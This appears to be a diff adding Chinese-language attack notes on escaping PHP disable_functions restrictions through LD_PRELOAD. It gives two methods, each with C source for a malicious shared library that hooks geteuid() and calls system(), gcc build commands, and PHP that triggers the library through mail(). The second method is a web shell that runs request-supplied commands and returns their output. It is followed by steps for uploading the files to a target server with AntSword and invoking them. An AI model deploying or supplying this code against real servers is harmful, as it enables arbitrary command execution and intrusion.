@@ -1,0 +1,72 @@
+
+方式一:
+1、hack1.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+void payload(){
+    system("ls /var/www/html > /tmp/benben");
+}
+int geteuid()
+{
+    if(getenv("LD_PRELOAD") == NULL){ return 0; }
+    unsetenv("LD_PRELOAD");
+    payload();
+}
+
+
+2、生成.so文件hack1.so
+gcc -c -fPIC hack1.c -o hack1
+gcc --share hack1 -o hack1.so
+
+
+3、通过putenv设置LD_PRELOAD，让hack1.so优先被调用。并通过mail函数发送一封邮件来触发。
+<?php
+putenv("LD_PRELOAD=/tmp/hack1.so");
+mail('','','','');
+?>
+
+
+方式二：
+
+（1）hack2.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int geteuid()
+{
+    const char* cmdline = getenv("EVIL_CMDLINE"); //获得系统的环境变量EVIL_CMDLINE
+    if(getenv("LD_PRELOAD") == NULL){ return 0; }
+    unsetenv("LD_PRELOAD"); //删除系统变量
+    system(cmdline);
+}
+（2）将c文件编译成动态链接库：
+gcc -shared -fPIC hack2.c -o hack2.so
+
+
+（3）qwzf2.php
+
+<?php
+$cmd = $_REQUEST["cmd"]; 
+$out_path = $_REQUEST["outpath"]; 
+$evil_cmdline = $cmd." > ".$out_path." 2>&1"; 
+echo "<br /><b>cmdline: </b>".$evil_cmdline; 
+putenv("EVIL_CMDLINE=".$evil_cmdline); 
+
+$so_path = $_REQUEST["sopath"]; 
+putenv("LD_PRELOAD=".$so_path); 
+mail("", "", "", ""); 
+
+echo "<br /><b>output: </b><br />".nl2br(file_get_contents($out_path))
+?>
+
+
+（4）将hack2.so文件和qwzf2.php文件，通过代码执行写入(或使用蚁剑直接上传)具有写入权限的目录。
+然后在浏览器上测试：
+
+http://x.x.x.165:8001/?code=include('/tmp/qwzf2.php');
+post: cmd=ls&outpath=/tmp/test&sopath=/tmp/hack2.so
+
+
